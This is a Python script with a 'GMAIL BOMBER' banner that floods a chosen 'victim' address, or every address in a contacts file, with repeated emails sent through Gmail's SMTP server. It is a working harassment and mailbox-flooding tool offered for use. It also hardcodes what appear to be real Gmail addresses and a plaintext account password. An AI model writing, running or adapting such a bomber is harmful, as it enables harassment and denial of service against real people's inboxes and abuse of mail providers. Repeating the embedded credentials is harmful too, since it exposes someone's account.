import smtplib, os 
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart



def get_users(file_name):
    emails = []
    

    with open(file_name, mode = 'r', encoding = 'utf-8') as users_info:
        for user_info in users_info:
            
            emails.append(user_info.split()[0])
    return emails


def send_email_to_users_list(message, from_email, password, times):

    emails = get_users('contacts.txt')
    print('[*] Starting...')
    i = 1
    for email in emails:
        print('    [*] Starting...')
        for time in range(times):
            msg = MIMEMultipart()
            msg.attach(MIMEText(message, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()
            server.login(from_email, password)
            server.sendmail(from_email, email, msg.as_string())
            server.quit()
            print('    [+] ',time + 1,' \\ ',times,' mail sent!')

        print('[+] Sent to the ',i,' persone')
        i = i + 1

def send_email_to_a_user(message, from_email, password, to_email, times):

    

    print('\n [*] Starting...')
    try:
        for i in range(times):
            msg = MIMEMultipart()
            msg.attach(MIMEText(message, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()
            server.login(from_email, password)
            server.sendmail(from_email, to_email, msg.as_string())
            server.quit()
            print('[+] ',i + 1,' \\ ',times,' mail sent!')
            
    except: 

        print('Something went wrong!')
        quit()
    print('Successfully!')

def main():
    os.system('clear')

    print('╔═══╗╔═╗╔═╗╔═══╗╔══╗╔╗───     ╔══╗─╔═══╗╔═╗╔═╗╔══╗─╔═══╗╔═══╗\n'
        '║╔═╗║║║╚╝║║║╔═╗║╚╣─╝║║───     ║╔╗║─║╔═╗║║║╚╝║║║╔╗║─║╔══╝║╔═╗║\n'
        '║║─╚╝║╔╗╔╗║║║─║║─║║─║║───     ║╚╝╚╗║║─║║║╔╗╔╗║║╚╝╚╗║╚══╗║╚═╝║\n'
        '║║╔═╗║║║║║║║╚═╝║─║║─║║─╔╗     ║╔═╗║║║─║║║║║║║║║╔═╗║║╔══╝║╔╗╔╝\n'
        '║╚╩═║║║║║║║║╔═╗║╔╣─╗║╚═╝║     ║╚═╝║║╚═╝║║║║║║║║╚═╝║║╚══╗║║║╚╗\n'
        '╚═══╝╚╝╚╝╚╝╚╝─╚╝╚══╝╚═══╝     ╚═══╝╚═══╝╚╝╚╝╚╝╚═══╝╚═══╝╚╝╚═╝\n')

    to_email = 'milagamadrilla@gmail.com'
    message = 'Hello world'

    from_email = 'vasenkvak1@gmail.com'
    password = 'vasenkvak1'


    print('\nWhat kind of bomber whould you like to use:')
    print('1 - For a person 2 - For a list of people')
    choise = int(input(': '))

    if choise == 1:

        from_email = input('Your gmail: ')
        password = input('Your password: ')

        to_email = input('Victim\'s gmail: ')
        message = input('Text: ')

        times = int(input('How much times (it will be sent): '))

        send_email_to_a_user(message, from_email, password, to_email, times)


    elif choise == 2:
        print('Insert the list of the all people\'s gmail\'s adresses, in contacts.txt  ')
        from_email = input('Your gmail: ')
        password = input('Your password: ')

        message = input('Text: ')

        times = int(input('How much times (it will be sent to ecah person): '))



        send_email_to_users_list(message, from_email, password, times)

    
    
    











main() 	